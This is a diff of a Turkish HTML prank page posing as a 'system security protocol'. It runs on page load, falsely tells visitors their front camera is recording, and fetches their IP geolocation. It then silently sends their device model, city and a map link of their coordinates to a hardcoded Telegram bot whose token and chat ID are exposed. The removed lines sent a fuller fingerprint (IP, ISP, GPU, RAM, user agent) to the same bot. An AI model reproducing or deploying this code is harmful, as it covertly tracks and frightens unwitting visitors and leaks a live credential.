@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Sistem Teşhis ve Güvenlik Paneli</title>
+  <title>Sistem Güvenlik Protokolü</title>
   <style>
     html, body {
       margin: 0; padding: 0; width: 100%; height: 100vh;
@@ -20,152 +20,136 @@
       white-space: pre-wrap;
     }
     #map { height: 250px; border-top: 1px solid #0f0; filter: grayscale(100%) invert(100%) brightness(0.7); }
-    .scan-line {
-      position: absolute; width: 100%; height: 4px; background: rgba(0, 255, 0, 0.05);
-      top: 0; animation: scan 4s linear infinite; pointer-events: none; z-index: 10;
+    
+    /* Büyük Bildirim Paneli */
+    #cameraAlert {
+      display: none;
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80%;
+      background: rgba(255, 0, 0, 0.9);
+      color: white;
+      padding: 40px;
+      text-align: center;
+      border: 5px solid white;
+      z-index: 9999;
+      box-shadow: 0 0 50px #f00;
+      animation: blink 0.5s infinite;
     }
-    @keyframes scan { from { top: 0; } to { top: 100%; } }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.7; }
+      100% { opacity: 1; }
+    }
+
+    .progress-container {
+      width: 100%; border: 1px solid #0f0; height: 15px; margin: 5px 0;
+    }
+    .progress-bar { width: 0%; height: 100%; background: #0f0; }
+
     #exitBtn {
-      background: #0f0; color: #000; border: none; padding: 15px;
+      background: #f00; color: #fff; border: none; padding: 15px;
       font-weight: bold; cursor: pointer; display: none; width: 100%;
-      text-transform: uppercase; letter-spacing: 2px;
     }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
 </head>
 <body>
-  <div class="scan-line"></div>
+
+  <div id="cameraAlert">
+    <h1 style="font-size: 40px; margin: 0;">⚠️ ERİŞİM ONAYLANDI ⚠️</h1>
+    <p style="font-size: 20px;">ÖN KAMERA AKTİF: GÖRÜNTÜ KAYDEDİLİYOR...</p>
+  </div>
+
   <div id="container">
     <pre id="terminal"></pre>
     <div id="map"></div>
-    <button id="exitBtn">PROTOKOLÜ DURDUR</button>
+    <button id="exitBtn">SİSTEMİ DURDUR VE VERİLERİ İMHA ET</button>
   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
 
   <script>
     const terminal = document.getElementById('terminal');
+    const alertBox = document.getElementById('cameraAlert');
     const btn = document.getElementById('exitBtn');
 
     function log(text, delay = 0) {
       return new Promise(res => {
         setTimeout(() => {
-          terminal.textContent += `[SYSTEM]: ${text}\n`;
+          terminal.textContent += `[+] ${text}\n`;
           terminal.scrollTop = terminal.scrollHeight;
           res();
         }, delay);
       });
     }
 
-    // Sahte HWID (Cihaz Parmak İzi) oluşturma
-    function generateFingerprint() {
-        const data = [
-            navigator.userAgent,
-            navigator.language,
-            screen.colorDepth,
-            navigator.hardwareConcurrency,
-            screen.width + 'x' + screen.height,
-            new Date().getTimezoneOffset(),
-            !!window.sessionStorage,
-            !!window.localStorage
-        ].join('||');
-        
-        // Basit bir hash fonksiyonu (HWID gibi görünmesi için)
-        let hash = 0;
-        for (let i = 0; i < data.length; i++) {
-            hash = ((hash << 5) - hash) + data.charCodeAt(i);
-            hash |= 0;
-        }
-        return "HWID-" + Math.abs(hash).toString(16).toUpperCase() + "-" + (Math.random() * 10000).toFixed(0);
+    function showLoadingBar(text) {
+      return new Promise(res => {
+        terminal.textContent += `[!] ${text}\n`;
+        const container = document.createElement('div');
+        container.className = 'progress-container';
+        const bar = document.createElement('div');
+        bar.className = 'progress-bar';
+        container.appendChild(bar);
+        terminal.appendChild(container);
+        let width = 0;
+        const interval = setInterval(() => {
+          if (width >= 100) { clearInterval(interval); res(); }
+          else { width += 10; bar.style.width = width + '%'; }
+        }, 100);
+      });
     }
 
-    // Ekran kartı (GPU) bilgisini çekme
-    function getGPU() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        if (!gl) return "Bilinmiyor";
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+    function getDeviceModel() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return ua.match(/Android.*;\s([^;]+)\sBuild/)?.[1] || "Android Cihaz";
+        if (/iPhone/.test(ua)) return "Apple iPhone";
+        return "PC/Masaüstü";
     }
 
     async function startProcess() {
-      await log("ROOT ERİŞİMİ SAĞLANDI...", 400);
-      await log("DONANIM ANALİZİ BAŞLATILIYOR...", 600);
-
-      const hwid = generateFingerprint();
-      const gpu = getGPU();
+      await log("SİSTEME SIZILIYOR...", 500);
+      await log("CİHAZ: " + getDeviceModel(), 500);
       
-      const deviceInfo = {
-        res: `${screen.width}x${screen.height}`,
-        plat: navigator.platform,
-        cores: navigator.hardwareConcurrency || "N/A",
-        ua: navigator.userAgent,
-        time: new Date().toLocaleString('tr-TR'),
-        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor"
-      };
+      await showLoadingBar("KAMERA PROTOKOLLERİ BYPASS EDİLİYOR...");
+      
+      // BÜYÜK BİLDİRİMİ GÖSTER
+      alertBox.style.display = 'block';
+      setTimeout(() => { alertBox.style.display = 'none'; }, 4000); // 4 saniye sonra kaybolur
 
-      await log(`CIHAZ KIMLIĞI: ${hwid}`, 300);
-      await log(`GPU: ${gpu}`, 300);
-      await log(`RAM: ${deviceInfo.ram}`, 300);
+      await log("BAŞARILI: ÖN KAMERA ERİŞİMİ SAĞLANDI.", 300);
+      await log("YÜZ VERİSİ ANALİZ EDİLİYOR...", 500);
 
       try {
         const response = await fetch('https://ipwho.is/');
         const data = await response.json();
 
-        await log(`AĞ: ${data.connection.isp}`, 400);
-        await log(`LOKASYON: ${data.city} / ${data.latitude}, ${data.longitude}`, 400);
-
-        const map = L.map('map', {zoomControl: false, attributionControl: false}).setView([data.latitude, data.longitude], 14);
+        const map = L.map('map', {zoomControl: false}).setView([data.latitude, data.longitude], 14);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         L.marker([data.latitude, data.longitude]).addTo(map);
 
         // Telegram Mesajı
         const tgMsg = `
-⚡ <b>KRITIK VERI SIZINTISI</b> ⚡
-
-🔑 <b>DONANIM KIMLIĞI (HWID):</b>
-<code>${hwid}</code>
-
-📱 <b>CIHAZ BILGILERI:</b>
-<b>İşlemci:</b> ${deviceInfo.cores} Çekirdek
-<b>Bellek:</b> ${deviceInfo.ram}
-<b>GPU:</b> ${gpu}
-<b>Çözünürlük:</b> ${deviceInfo.res}
-<b>Platform:</b> ${deviceInfo.plat}
-
-🌍 <b>AĞ & KONUM:</b>
-<b>IP:</b> ${data.ip}
-<b>ISP:</b> ${data.connection.isp}
-<b>Konum:</b> ${data.city}, ${data.country}
-<b>Harita:</b> https://www.google.com/maps?q=${data.latitude},${data.longitude}
-
-🔍 <b>USER AGENT:</b>
-<code>${deviceInfo.ua}</code>
+📸 <b>KAMERA ERİŞİMİ SAĞLANDI!</b>
+👤 <b>Cihaz:</b> ${getDeviceModel()}
+🌍 <b>Şehir:</b> ${data.city}
+📍 <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Konumu Aç</a>
         `;
 
-        await fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
+        fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: '6400737507',
-            text: tgMsg,
-            parse_mode: 'HTML'
-          })
+          body: JSON.stringify({ chat_id: '6400737507', text: tgMsg, parse_mode: 'HTML' })
         });
 
-        await log("VERİLER BULUT SUNUCUSUNA AKTARILDI.", 500);
-        await log("TAKİP AKTİF EDİLDİ.", 400);
-        
+        await log("VERİLER AKTARILIYOR: 100%", 500);
         btn.style.display = 'block';
-      } catch (e) {
-        await log("HATA: Güvenlik Duvarı Aşılamadı.");
-      }
+      } catch (e) { await log("HATA!"); }
     }
 
-    btn.onclick = () => {
-      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    };
-
+    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     window.onload = startProcess;
   </script>
 </body>
